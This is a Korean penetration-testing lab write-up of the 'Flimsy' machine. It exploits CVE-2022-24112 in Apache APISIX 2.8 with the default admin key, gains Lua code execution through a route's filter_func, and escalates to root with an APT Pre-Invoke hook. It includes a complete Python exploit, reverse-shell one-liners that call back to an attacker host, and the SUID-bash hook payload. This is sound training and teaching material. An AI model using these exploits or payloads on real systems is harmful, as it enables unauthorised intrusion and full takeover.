---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/enum/dirbust
  - tech/web/default-creds
  - tech/web/auth-bypass
  - tech/web/cmd-injection
  - tech/payload/revshell
  - tech/lin/cron
  - tech/lin/suid
type: machine
platform: pg
os: linux
ip: 192.168.248.220
ports: [22, 80, 3306, 9443, 43500]
services: [http, mysql, ssh, ssl/tungsten-https, tungsten-https]
cves: [CVE-2022-24112]
status: solved
manual_tags: true
manual_cves: true
tech_count: 7
---
> [!warning] 적대적 검증 정정 이력 (2026-08-20)
> 초고를 산출물(`~/PG/Flimsy/` 26개 파일)·APISIX 2.8 소스·Kali 실측과 대조해 고친 것. 전문은 `03. PG/_AUDIT/Flimsy-audit.md`.
>
> | 위치 | 무엇이 틀렸나 | 근거 |
> |---|---|---|
> | §2 우회 메커니즘 | "하위 요청의 클라이언트 IP 를 `X-Real-IP` 에서 가져온다" — 2.8 의 `batch-requests.lua` 에는 IP 처리 코드가 아예 없다 | apisix 2.8 `apisix/plugins/batch-requests.lua` |
> | §3 "안쪽만 넣으면 바깥 요청이 걸러진다" | 반대다. 안쪽(`headers`)이 우선이고 바깥은 빈 키만 채운다. batch-requests 엔드포인트 자체에는 IP 제한이 없다 | 같은 소스 + `try1_batch_probe.log`(외부 IP 에서 200) |
> | §2 IP 허용목록 기본값 `127.0.0.1` | 실제 기본값은 `127.0.0.0/24` | apisix 2.8 `conf/config-default.yaml` |
> | §1 "gobuster 를 끝까지 돌렸다" | 끝까지 안 돌았다. 타임아웃 에러가 쏟아지는 상태로 21:38 에 죽였다 | `gobuster_root.full.txt` 말미 |
> | §6-4 "`grep -c` 가 395,013 을 줬다" | grep 종류 차이가 아니라 **1분 사이에 로그가 자란 것**이다 | `traces_confirmed.log`(21:35) vs `traces_nginx.log`(21:36) |
> | 남긴 흔적 `apt/history.log` | `apt-get update` 는 history.log 에 아무것도 안 남긴다 | Kali 에서 직접 실행해 diff |
> | §3 PTY 승격 명령 | 실제 친 명령과 다르게 정리돼 있었다 | `pane_full.txt` 원문 복원 |
> | §4 `ls -ld` 블록 · §6-5 Kali 프롬프트 블록 | 산출물에 없고 PTY 에코 패턴과도 안 맞는다 → 코드펜스 해제 | 아래 각 절 |
> | 남긴 흔적 `pwn1` "남아 있다고 가정" | 박스가 살아 있을 때 기준이었다. **「삭제 확인 못 함 / 박스 정지로 해소」로 분리**해 적었다 — 「확인된 삭제」와 「리버트로 사라짐」은 다른 정보다 | `writeup_notes.txt` 21:38 · `routes_after_cleanup.json`(0바이트) |

> [!info] PG Practice — Flimsy
> **타겟** 192.168.248.220 · **OS** Ubuntu 20.04 (`flimsy`) · **난이도** Fundamental · **플래그 2개**
> **경로 요약** tcp/43500 **Apache APISIX 2.8** → **CVE-2022-24112** (`batch-requests` 가 하위 요청을 루프백에서 재발행하고 호출자 헤더를 그대로 실어, Admin API 의 IP 허용목록이 무너진다) → 기본 admin key 로 라우트 생성, `filter_func` 안의 Lua `os.execute` 로 RCE → `franklin`(uid 65534) → 세계쓰기 `/etc/apt/apt.conf.d` + 매분 도는 `root apt-get update` → SUID bash → root

## 0. 이 박스에서 배우는 것

- **`-p-` 없이는 이 박스를 못 푼다.** top-1000 은 22·80·3306 만 준다. 43500 은 `nmap-services` 에 **등재 자체가 없어** top-N 을 아무리 늘려도 안 나온다
- **403 은 "여기 IP 제한이 걸려 있다"는 정보다.** APISIX Admin API 가 403 을 준 것이 CVE-2022-24112 의 전제조건이 충족됐다는 신호였다
- **설정 필드가 코드를 받으면 그것이 RCE 다.** APISIX 라우트의 `filter_func` 는 Lua 로 평가된다. 파일 업로드도 템플릿도 아닌 "라우팅 규칙"이 실행 경로였다
- **매분 도는 root 크론 + 세계쓰기 설정 디렉터리** — `apt-get update` 를 root 가 돌면 `/etc/apt/apt.conf.d` 쓰기 권한이 곧 root 다
- **버퍼링을 방화벽으로 오독하지 않기** — `nc ... | tee` 는 셸이 붙어 있어도 화면에 아무것도 안 띄운다

> [!tip] 시험 출제 가능성
> **버전 판정 → 공개 PoC 적용**이라는 형태 자체가 OSCP 웹 박스의 표준이다. APISIX 가 그대로 나올 확률은 낮지만,
> ① **비표준 고포트에 뜬 관리용 API**, ② **기본 관리 토큰이 설정파일에 하드코딩**, ③ **"내부에서만 접근 가능"을 헤더로 판정하는 인가**
> 이 셋은 조합만 바꿔 계속 나온다. 특히 ③ — `X-Real-IP`·`X-Forwarded-For` 로 내부 판정을 하는 서비스를 만나면 반사적으로 위조해봐야 한다.
>
> 권한상승 쪽은 더 직접적이다. **"root 크론이 매분 무언가를 돌고, 그게 읽는 설정 디렉터리가 쓰기 가능하다"**는 리눅스 Fundamental 의 단골 마무리다.

## 1. 정찰

### Nmap

예열로 top-1000 을 먼저 돌렸다. 이게 함정이었다.

출처: `~/PG/Flimsy/nmap_quick.log`

```
Nmap scan report for 192.168.248.220
Host is up (0.089s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

22·80·3306. 여기서 판단을 시작했으면 80 번 정적 사이트와 접속 거부되는 MySQL 만 붙들고 있었을 것이다. `-p-` 결과를 기다린 게 전부였다.

출처: `~/PG/Flimsy/nmap.log`

```
Nmap scan report for 192.168.248.220
Host is up (0.085s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE             VERSION
22/tcp    open  ssh                 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http                nginx 1.18.0 (Ubuntu)
|_http-title: Upright
|_http-server-header: nginx/1.18.0 (Ubuntu)
3306/tcp  open  mysql               MySQL (unauthorized)
9443/tcp  open  ssl/tungsten-https?
43500/tcp open  http                OpenResty web app server
|_http-server-header: APISIX/2.8
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
```

`APISIX/2.8`. 이 한 줄이 박스 전체다.

왜 예열 스캔이 이걸 못 줬는지는 `nmap-services` 를 보면 끝난다. **43500/tcp 는 `nmap-services` 에 아예 없다** — 등재되지 않은 포트는 `--top-ports` 를 몇으로 잡든 후보에 들어가지 않는다. 9443 은 등재돼 있지만 빈도순 **1096위**라 top-1000 바로 바깥이다.

```
$ grep -P '\t43500/tcp' /usr/share/nmap/nmap-services      # 출력 없음
$ grep '/tcp' /usr/share/nmap/nmap-services | sort -k3 -rn | grep -n '9443/tcp'
1096:tungsten-https	9443/tcp	0.000152	# WSO2 Tungsten HTTPS
```

(위 두 줄은 이 박스가 아니라 **Kali 에서 확인한 것**이다. 일반화의 근거는 이 박스의 관측이 아니라 별도 확인이어야 한다.)

9443 은 APISIX 의 TLS 데이터플레인이다. `curl -k` 로 아무것도 돌아오지 않아 더 파지 않았다.
`Running: Linux 5.X, MikroTik RouterOS 7.X` 라는 OS 추정도 같이 나오는데, 이건 무시해도 된다 — 실제로는 Ubuntu 20.04 였다.

### 80 번은 미끼다

![[PG-Flimsy-80-upright-decoy.png]]

templatemo 계열 정적 템플릿("Upright"). `Last-Modified: Thu, 28 Apr 2022` 로 고정돼 있고 동적 요소가 없다.
gobuster 는 `directory-list-2.3-medium.txt` 에 `-x php,txt,html,zip,bak`, 스레드 50 으로 돌렸다. 나온 것은 `/img`, `/css`, `/js` 뿐이었다.

```
/index.html           (Status: 200) [Size: 50895]
/img                  (Status: 301) [Size: 178] [--> http://192.168.248.220/img/]
/css                  (Status: 301) [Size: 178] [--> http://192.168.248.220/css/]
/js                   (Status: 301) [Size: 178] [--> http://192.168.248.220/js/]
```

출처: `~/PG/Flimsy/gobuster_root.txt`

**끝까지 돈 게 아니다.** `gobuster_root.full.txt` 말미는 `[ERROR] error on word ...: timeout occurred during the request` 로 도배돼 있다 — 사전을 다 소진한 게 아니라 타겟이 응답을 못 하기 시작한 상태에서 21:38 에 죽였다. 그래서 "80 번에 아무것도 없다"는 판정의 근거는 gobuster 완주가 아니라 **정적 템플릿이라는 것**(위 스크린샷, 고정된 `Last-Modified`)이다.

### 3306 은 외부에서 못 쓴다

```
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.207' is not allowed to connect to this MySQL server
```

바인딩은 `0.0.0.0:3306` 이지만 grant 가 localhost 한정이라 외부에서는 인증 단계에 도달하지도 못한다. 30초 만에 접었다.

### 버전 판정 — 근거 둘

배너 하나로 CVE 를 고르지 않는다.

1. `Server: APISIX/2.8` 응답 헤더 (nmap 과 `curl -i` 양쪽에서 동일)
2. **행동** — `/apisix/batch-requests` 로 감싼 Admin API 호출이 실제로 200 을 받았다(§3). 2.12.1/2.10.4 이상이면 이 경로가 막혀 있다

root 를 잡은 뒤 `config.yaml` 로 3차 확인이 됐다(§4).

## 2. 취약점 분석 — CVE-2022-24112

### 구조

APISIX 는 API 게이트웨이다. 라우팅 규칙은 **Admin API**(`/apisix/admin/*`)로 넣고, 규칙은 etcd 에 저장된다.
Admin API 는 두 겹으로 보호된다.

- **IP 허용목록** — 기본값이 `allow_admin: - 127.0.0.0/24`, 즉 루프백 대역뿐이다
- **`X-API-KEY` 토큰** — 기본값이 배포본에 박혀 있는 `edd1c9f034335f136f87ad84b625c8f1` (같은 파일에 `viewer` 용 `4054f7cf07e344346cd3f287985e76a2` 도 있다)

두 기본값 모두 2.8 태그의 `conf/config-default.yaml` 원문에서 확인한 것이고, 이 박스의 실제 `config.yaml` 은 root 를 잡은 뒤 §4 에서 대조했다.

외부에서 직접 때리면 첫 겹에서 막힌다.

> [!warning] 아래 403 응답은 파일로 보존되지 않았다
> 21:25 시점 작업 메모(`writeup_notes.txt`)에 "`/apisix/admin/routes` 직접 → openresty 403 Forbidden" 으로 남아 있을 뿐, `curl` 출력 자체를 리다이렉트한 로그가 없다. 아래는 그 세션 기록에서 옮긴 것이다.

```
$ curl -s -i 'http://192.168.248.220:43500/apisix/admin/routes' -H 'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1'
HTTP/1.1 403 Forbidden
Server: openresty
...
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>openresty</center>
</body>
</html>
```

이 403 은 실패가 아니라 **전제조건 확인**이다. IP 허용목록이 켜져 있다는 뜻이고, CVE-2022-24112 는 정확히 그 허용목록을 우회하는 결함이다.

### 우회 — `batch-requests`

`batch-requests` 플러그인은 하나의 HTTP 요청 안에 여러 하위 요청을 담아 게이트웨이가 **자기 자신에게 내부적으로** 재발행하게 한다. 재발행은 `127.0.0.1` 로 나간다.

무너지는 지점은 두 가지가 겹친 것이다.

1. 하위 요청은 게이트웨이 자신이 루프백으로 거는 것이므로, Admin API 가 보는 연결 상대는 **이미 로컬호스트**다
2. 2.8 의 `batch-requests.lua` 에는 **클라이언트 IP 를 다시 세우는 코드가 아예 없다.** 호출자가 지정한 헤더가 그대로 하위 요청에 실린다 — `X-Real-IP` 를 포함해서

그래서 Admin API 의 IP 판정은 어느 쪽으로도 통과한다. 2.12.1 이 넣은 수정이 이걸 정확히 보여준다 — 하위 요청마다 real-ip 헤더를 **실제 클라이언트 IP 로 덮어쓴다.**

```lua
-- apisix 2.12.1 batch-requests.lua, set_common_header() 끝줄
req.headers[real_ip_hdr] = core.request.get_remote_client_ip()
```

두 겹 중 첫 겹이 이걸로 무너지고, 두 번째 겹은 기본 키가 안 바뀌어 있어 애초에 방어가 아니었다.

### 왜 이 페이로드인가 — `filter_func`

Admin API 를 잡았다고 바로 셸이 되는 건 아니다. 라우트 스키마 중 **`filter_func` 는 Lua 함수 소스를 문자열로 받아** 라우트 매칭 시점에 평가한다. 즉 설정 필드에 코드를 넣을 수 있다.

```lua
function(vars) os.execute('bash -c "0<&160-;exec 160<>/dev/tcp/192.168.45.207/443;sh <&160 >&160 2>&160"'); return true end
```

조각을 나누면:

| 조각 | 역할 |
|---|---|
| `function(vars) ... return true end` | APISIX 가 요구하는 필터 시그니처. `true` 를 반환해야 라우트가 매칭된 것으로 처리된다 |
| `os.execute(...)` | Lua 표준 라이브러리. OpenResty 워커 프로세스 권한으로 셸 명령 실행 |
| `0<&160-` | `n<&m-` 은 fd `m` 을 fd `n` 으로 **옮기는**(dup 후 원본 닫기) 문법이니 여기서는 160 → stdin 이다. 그런데 이 시점에 160 은 열려 있지 않다 — bash 는 `160: Bad file descriptor` 를 뱉고 **다음 명령으로 그냥 넘어간다**(Kali 에서 확인, exit 0). 원라이너에 관용적으로 붙어 있는 앞머리일 뿐 실제 일은 아래 두 줄이 한다 |
| `exec 160<>/dev/tcp/...` | bash 전용 기능. TCP 소켓을 fd 160 에 읽기·쓰기로 연다 |
| `sh <&160 >&160 2>&160` | 그 소켓에 stdin/stdout/stderr 를 전부 물린 `sh` |

`bash -c` 로 감싼 이유가 있다. `/dev/tcp` 는 **bash 의 기능이지 POSIX sh 의 기능이 아니다.** `os.execute` 는 `/bin/sh` 를 부르고 우분투에서 그건 dash 다. 그리고 dash 는 `/dev/tcp` 에 **도달조차 못 한다** — 앞의 `0<&160-` 에서 먼저 파싱이 깨진다. Kali 에서 같은 페이로드를 dash 에 그대로 던져보면 이렇다.

```
$ dash -c '0<&160-;exec 160<>/dev/tcp/127.0.0.1/9;sh <&160 >&160 2>&160'
dash: 1: Syntax error: Bad fd number
```

`No such file or directory` 가 아니다. 파일이 없어서 실패하는 게 아니라 **문법 단계에서 죽는 것**이라 에러 문구만 보고 "경로 문제"로 오독하기 쉽다.

> [!note] 이 박스의 이미지에 이전 작업자의 페이로드가 굳어 있다
> Admin API 를 처음 읽었을 때 라우트가 **이미 하나** 있었다. `id=index`, `uri=/rms/fzxewh`, `filter_func` 안에 `192.168.118.3:80` 으로 나가는 리버스셸, `create_time` 은 1658799753 = 2022-07-26.
> 남의 IP 로 나가는 셸이라 나에게는 쓸모가 없고, 덮어쓰면 원래 상태를 잃는다. `routes_preexisting.json` 으로 보존하고 **내 라우트는 `id=pwn1` 로 분리**했다.
> 교훈은 두 개다. ① 남의 백도어를 재사용하려 들지 마라 — LHOST 가 내 것이 아니다. ② **기존 상태를 먼저 덤프하고 나서 쓴다.** 정리 단계에서 "원래 뭐가 있었는지"를 알아야 되돌릴 수 있다.

## 3. Foothold

### 우회 검증

먼저 읽기만 해본다. 파괴적이지 않고, 되면 그 다음이 확실하다.

출처: `~/PG/Flimsy/try1_batch_probe.sh`

```bash
#!/bin/bash
T=192.168.248.220:43500
curl -s -i -X POST "http://$T/apisix/batch-requests" \
  -H 'X-Real-IP: 127.0.0.1' \
  -H 'Content-Type: application/json' \
  -d '{"headers":{"X-Real-IP":"127.0.0.1","X-API-KEY":"edd1c9f034335f136f87ad84b625c8f1","Content-Type":"application/json"},"timeout":1500,"pipeline":[{"method":"GET","path":"/apisix/admin/routes"}]}'
```

`X-Real-IP` 가 **두 군데** 들어가 있다. 초고는 "안쪽만 넣으면 바깥 요청이 걸러진다"고 적었는데 **틀렸다.** 2.8 소스의 `set_common_header()` 는 ① 본문 `headers` 를 하위 요청에 먼저 깔고 ② 바깥 요청 헤더로 **아직 안 채워진 키만** 메운다. 즉 안쪽이 우선이고 바깥은 예비다. 그리고 `/apisix/batch-requests` 는 데이터플레인 엔드포인트라 IP 제한이 걸려 있지 않다 — 실제로 우리 외부 IP 에서 보낸 바깥 요청이 그대로 200 을 받았다(아래 로그).

둘 다 넣는 건 손해가 없어서 그대로 뒀다. 시험장에서 헷갈리면 **본문 `headers` 쪽 하나면 된다.**

출처: `~/PG/Flimsy/try1_batch_probe.log`

```
HTTP/1.1 200 OK
Date: Thu, 20 Aug 2026 12:25:10 GMT
Content-Type: text/plain; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Server: APISIX/2.8

[{"status":200,"body":"{\"action\":\"get\",\"count\":1,\"node\":{\"dir\":true,\"key\":\"\\\/apisix\\\/routes\",\"nodes\":[{\"value\":{\"status\":1,\"filter_func\":\"function(vars) os.execute('bash -c \\\\\\\"0<&160-;exec 160<>\\\/dev\\\/tcp\\\/192.168.118.3\\\/80;sh <&160 >&160 2>&160\\\\\\\"'); return true end\",\"update_time\":1658799753,\"uri\":\"\\\/rms\\\/fzxewh\",\"upstream\":{\"nodes\":{\"schmidt-schaefer.com\":1},\"type\":\"roundrobin\",\"scheme\":\"http\",\"pass_host\":\"pass\",\"hash_on\":\"vars\"},\"priority\":0,\"create_time\":1658799753,\"id\":\"index\",\"name\":\"wthtzv\"},\"createdIndex\":15772,\"key\":\"\\\/apisix\\\/routes\\\/index\",\"modifiedIndex\":15772}]}}\n","reason":"OK","headers":{"Transfer-Encoding":"chunked","Access-Control-Allow-Credentials":"true","Date":"Thu, 20 Aug 2026 12:25:10 GMT","Access-Control-Expose-Headers":"*","Connection":"keep-alive","Access-Control-Allow-Origin":"*","Content-Type":"application\/json","Server":"openresty","Access-Control-Max-Age":"3600"}}]
```

바깥은 200, 하위 요청도 `"status":200`. **두 층 모두 확인해야 한다** — 바깥 200 은 batch-requests 가 요청을 받았다는 뜻일 뿐이고, 우회 성공은 안쪽 status 로 판정한다.

### 익스플로잇

JSON 문자열 안에 또 JSON 문자열이 들어가고 그 안에 따옴표 든 Lua 가 들어간다. 이 삼중 인용을 손으로 쓰면 반드시 틀린다 — `json.dumps` 에 맡겼다.

출처: `~/PG/Flimsy/exploit_apisix.py`

```python
#!/usr/bin/env python3
# CVE-2022-24112 - Apache APISIX 2.8 admin API IP-restriction bypass -> Lua RCE
# The batch-requests plugin trusts a client-supplied X-Real-IP when it replays
# sub-requests internally, so the admin API's 127.0.0.1 allowlist is bypassed.
import json, sys, urllib.request

TARGET = 'http://192.168.248.220:43500'
KEY    = 'edd1c9f034335f136f87ad84b625c8f1'   # APISIX default admin key
LHOST, LPORT = '192.168.45.207', 443
RID, URI = 'pwn1', '/pwn1'

cmd = f'bash -c "0<&160-;exec 160<>/dev/tcp/{LHOST}/{LPORT};sh <&160 >&160 2>&160"'
route = {
    'uri': URI,
    'upstream': {'type': 'roundrobin', 'nodes': {'example.com:80': 1}},
    # filter_func is evaluated as Lua by the router on every request match
    'filter_func': "function(vars) os.execute('" + cmd + "'); return true end",
}
payload = {
    'headers': {'X-Real-IP': '127.0.0.1', 'X-API-KEY': KEY,
                'Content-Type': 'application/json'},
    'timeout': 1500,
    'pipeline': [{'method': 'PUT', 'path': f'/apisix/admin/routes/{RID}',
                  'body': json.dumps(route)}],
}
if sys.argv[1:] == ['trigger']:
    try:
        urllib.request.urlopen(TARGET + URI, timeout=5).read()
    except Exception as e:
        print('trigger returned:', e)
else:
    req = urllib.request.Request(TARGET + '/apisix/batch-requests',
        data=json.dumps(payload).encode(),
        headers={'X-Real-IP': '127.0.0.1', 'Content-Type': 'application/json'})
    print(urllib.request.urlopen(req, timeout=15).read().decode())
```

`upstream` 은 스키마 필수 필드라 넣었을 뿐 실제로 쓰이지 않는다. `filter_func` 는 **업스트림에 프록시하기 전, 라우트 매칭 단계에서** 평가되기 때문에 `example.com` 이 안 열려도 상관없다.

라우트 생성:

출처: `~/PG/Flimsy/try2_route_create.log`

```
[{"status":201,"body":"{\"node\":{\"value\":{\"status\":1,\"filter_func\":\"function(vars) os.execute('bash -c \\\"0<&160-;exec 160<>\\\/dev\\\/tcp\\\/192.168.45.207\\\/443;sh <&160 >&160 2>&160\\\"'); return true end\",\"update_time\":1787228753,\"id\":\"pwn1\",\"priority\":0,\"create_time\":1787228753,\"uri\":\"\\\/pwn1\",\"upstream\":{\"nodes\":{\"example.com:80\":1},\"type\":\"roundrobin\",\"hash_on\":\"vars\",\"pass_host\":\"pass\",\"scheme\":\"http\"}},\"key\":\"\\\/apisix\\\/routes\\\/pwn1\"},\"action\":\"set\"}\n","reason":"Created","headers":{"Transfer-Encoding":"chunked","Access-Control-Allow-Credentials":"true","Date":"Thu, 20 Aug 2026 12:25:53 GMT","Access-Control-Expose-Headers":"*","Connection":"close","Access-Control-Allow-Origin":"*","Content-Type":"application\/json","Server":"openresty","Access-Control-Max-Age":"3600"}}]
```

`"status":201` = Created. 이제 `GET /pwn1` 한 번이면 발화한다.

발화 쪽 출력은 항상 타임아웃이다(`trigger returned: timed out`). 셸이 fd 를 물고 있어 응답이 끝나지 않기 때문이고, **이 타임아웃은 실패가 아니라 성공의 정상 형태다.**

### 셸

리스너는 tmux 안에.

```
ssh kali@10.44.44.128 "tmux new-session -d -s fli_sh 'sudo rlwrap -cAr nc -lvnp 443; exec bash'"
```

`tmux capture-pane -p -t fli_sh`:

```
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.220] 60800
id; hostname; hostname -I
uid=65534(franklin) gid=65534(nogroup) groups=65534(nogroup)
flimsy
192.168.248.220
```

아웃바운드 443 이 그냥 열려 있었다. 포트를 바꿔가며 찾는 시간이 0 이었다.

PTY 승격 (`pane_full.txt` 원문 — 셸에 실제로 밀어넣은 형태 그대로다. 바깥 인용부호를 이스케이프해야 하는 것이 요점이라 정리하지 않았다):

```
python3 -c "import pty;pty.spawn(\"/bin/bash\")"
franklin@flimsy:/root$ export TERM=xterm PS1="\u@\h:\w\$ "; id
export TERM=xterm PS1="\u@\h:\w\$ "; id
uid=65534(franklin) gid=65534(nogroup) groups=65534(nogroup)
```

같은 명령이 두 번 찍히는 것은 PTY 에코다. 이 박스의 타겟 블록은 전부 이 형태이고, **에코가 없는 타겟 블록은 손질된 것**이라고 봐야 한다.

승격 직후 프롬프트가 `franklin@flimsy:/root$` 였다. **cwd 가 `/root`** — APISIX 를 root 가 `/root` 에서 띄웠다는 뜻이고, §4 의 `run.sh` 로 정확히 확인된다.

> [!note] `franklin` 은 uid 65534 다
> `uid=65534(franklin)` 는 오타가 아니다. 65534 는 원래 `nobody` 자리인데 이 박스는 그 자리에 이름을 바꿔 넣었다.
> ```
> franklin:x:65534:65534::/home/frank:/bin/bash
> ```
> APISIX 워커는 기본 설정상 `nobody` 로 떨어지므로, 결과적으로 워커가 `franklin` 으로 보인다.
> 홈 경로가 `/home/frank` 인데 실제 디렉터리는 `/home/franklin` 이라 어긋나 있다 — 플래그를 `~` 로 찾으면 못 찾는다는 뜻이다.

## 4. 권한상승

### 열거

셸 잡자마자 `harvest.sh` 를 돌려 전 항목을 파일로 떨궜다(`~/PG/Flimsy/harvest_franklin.txt`, 1471행). 읽은 순서대로:

```
===== SUDO =====
sudo: a password is required
(sudo -n 실패 — 비밀번호 필요)
```

괄호 줄은 `harvest.sh` 가 직접 찍는 것이지 내가 끼워넣은 주석이 아니다(`harvest_franklin.txt:29`). 비번을 모르니 여기서 막힌다. `id` 의 그룹도 `nogroup` 하나뿐이라 특권 그룹 경로도 없다.

```
===== SUID =====
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/at
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
(이하 /snap/core20/1581·1587, /snap/snapd/16292·16010 아래 중복 26행 생략)
```

전부 우분투 20.04 기본이다. 비표준 없음. (`pkexec` 가 보이면 CVE-2021-4034 를 떠올리게 되는데, 이 박스는 그 경로가 필요 없었다 — 아래가 훨씬 짧다.)

```
===== CAPS =====
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
(이하 /snap/core20/1581·1587 의 ping 2행 생략)
```

전부 기본. 여기까지가 헛걸음이고, 다음 두 섹션이 답이다.

```
===== CRON =====
no crontab for franklin
-- /etc/crontab --
...
* * * * * root apt-get update
* * * * * root /root/run.sh
```

```
===== WRITABLE =====
/var/crash
/var/tmp
/run/screen
/run/lock
/usr/local/apisix/uwsgi_temp
/usr/local/apisix/fastcgi_temp
/usr/local/apisix/client_body_temp
/usr/local/apisix/proxy_temp
/usr/local/apisix/scgi_temp
/etc/apt/apt.conf.d
/tmp
...
```

**`/etc/apt/apt.conf.d` 가 쓰기 가능**하고 **root 가 매분 `apt-get update` 를 돈다.** 이 두 줄을 나란히 놓으면 끝이다.

퍼미션 확인. 초고에는 이 자리에 `ls -ld /etc/apt/apt.conf.d /root` 출력이 코드블록으로 실려 있었는데, **산출물 어디에도 그 명령의 출력이 없고** PTY 에코도 없어 손질된 블록으로 판단해 걷어냈다. 같은 사실은 아래 세 곳에 실제로 남아 있다.

- `harvest_franklin.txt` 의 `===== WRITABLE =====` 목록에 `/etc/apt/apt.conf.d` 가 들어 있다 (franklin 이 쓸 수 있다는 뜻)
- 21:30 작업 메모에 그 디렉터리가 `drwxrwxrwx` 로 적혀 있다
- `/root` 가 `drwx------ 9 root root ... Aug 20 12:18` 인 것은 아래 발화 블록의 `ls -la /root` 첫 줄에 그대로 보인다

### 왜 이것이 권한상승인가

`apt` 는 시작할 때 `/etc/apt/apt.conf.d/` 안의 모든 파일을 사전순으로 읽어 설정으로 합친다. 그 설정에는 **훅**이 있다 — `APT::Update::Pre-Invoke` 는 `apt-get update` 가 실제 갱신을 시작하기 **전에** 실행할 셸 명령 목록이다.
디렉터리에 쓸 수 있으면 훅을 추가할 수 있고, `apt-get update` 를 root 가 돌리므로 훅도 root 로 돈다.

파일명을 `99zzpwn` 으로 한 이유는 사전순 마지막이라 기존 설정과 충돌하지 않기 때문이다.

```
APT::Update::Pre-Invoke {"cp /bin/bash /tmp/rootbash; chown root:root /tmp/rootbash; chmod 4755 /tmp/rootbash";};
```

리버스셸 대신 SUID bash 를 고른 이유: 리스너를 하나 더 띄울 필요가 없고, **정리할 때 파일 두 개만 지우면 원상복구**된다.

`/tmp` 가 별도 마운트가 아니라 `/` (ext4, `nosuid` 없음) 위에 있는 것을 `mount` 로 먼저 확인했다. tmpfs `nosuid` 였으면 이 페이로드는 조용히 실패한다.

> [!danger] 훅 파일은 로컬에서 만들어 내려받아라
> 처음에 `printf` 로 원격에서 만들었더니 내용 끝에 리터럴 `n` 이 붙었다(§6). `apt.conf` 파서는 이런 걸 그냥 뱉고 죽는다.
> `cat -A` 로 마지막 바이트가 `};$` 인지 확인하는 습관이 이걸 잡아냈다.

### 발화

크론 한 사이클(최대 60초) 뒤. 아래는 tmux 스크롤백 원문이다 — **파일로 떨궈두지 않았고**, 나중에 저장한 `pane_root.txt` 는 이 뒤쪽만 담고 있어 이 부분은 세션 기록에서 옮겼다. 명령이 두 번 찍히는 PTY 에코와 80칸 줄접힘이 그대로다.

```
franklin@flimsy:/tmp$ ls -l /tmp/rootbash 2>&1
ls -l /tmp/rootbash 2>&1
-rwsr-xr-x 1 root root 1183448 Aug 20 12:32 /tmp/rootbash
franklin@flimsy:/tmp$ /tmp/rootbash -p
/tmp/rootbash -p
franklin@flimsy:/tmp$ export PS1="root@\h:\w# "; /usr/bin/id; /usr/bin/whoami; /
bin/ls -la /root
export PS1="root@\h:\w# "; /usr/bin/id; /usr/bin/whoami; /bin/ls -la /root
uid=65534(franklin) gid=65534(nogroup) euid=0(root) groups=65534(nogroup)
root
total 80
drwx------  9 root root 4096 Aug 20 12:18 .
drwxr-xr-x 19 root root 4096 Jun 15  2022 ..
lrwxrwxrwx  1 root root    9 Jun 30  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Jun 16  2022 .cache
-rw-r--r--  1 root root 1085 Jun 30  2022 .group.bak
drwxr-xr-x  3 root root 4096 Jun 16  2022 .local
-rw-r--r--  1 root root 2930 Jun 30  2022 .passwd.bak
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwxr-xr-x  2 root root 4096 Jun 30  2022 .rpmdb
-rw-r--r--  1 root root 1745 Jun 30  2022 .shadow.bak
drwx------  2 root root 4096 Jun 15  2022 .ssh
-rw-r--r--  1 root root  165 Jun 30  2022 .wget-hsts
-rw-r--r--  1 root root 8072 Jun 18  2022 build.sh
drwx------  3 root root 4096 Aug  3  2024 default.etcd
drwxr-xr-x  4 root root 4096 Jun 30  2022 flimsy
-rw-------  1 root root  854 Jun 30  2022 nohup.out
-rw-------  1 root root   33 Aug 20 12:18 proof.txt
-rwxrwxrwx  1 root root  154 Jun 30  2022 run.sh
drwx------  3 root root 4096 Jun 15  2022 snap
root@flimsy:/tmp#
```

`-p` 는 장식이 아니다. bash 는 `euid ≠ uid` 로 시작하면 스스로 특권을 드롭한다. `-p` 가 그 드롭을 막는다. 그래서 `id` 가 `uid=65534 ... euid=0` 로 남는다 — 정상이다.

### 두 번째 경로 — 있지만 franklin 은 도달할 수 없다

root 로 올라온 뒤 보이는 것:

출처: `~/PG/Flimsy/root_context.txt`

```
### /root/run.sh
#!/bin/bash

cp /root/.passwd.bak /etc/passwd
cp /root/.shadow.bak /etc/shadow
cp /root/.group.bak /etc/group

nohup etcd &
apisix init 
apisix start

### ls -l /root/run.sh
-rwxrwxrwx 1 root root 154 Jun 30  2022 /root/run.sh
```

`run.sh` 는 **777** 이고 크론이 매분 root 로 실행한다. 한 줄 덧붙이면 그대로 root 다.
그런데 `/root` 가 `drwx------` 라 `franklin` 은 **디렉터리를 통과할 수 없다.** 경로가 존재해도 도달이 불가능하다.

이건 "권한이 오르면 열거를 다시 돌려라"의 정확한 사례다. franklin 시점에서는 `/root/run.sh` 의 777 을 볼 방법이 없었다.
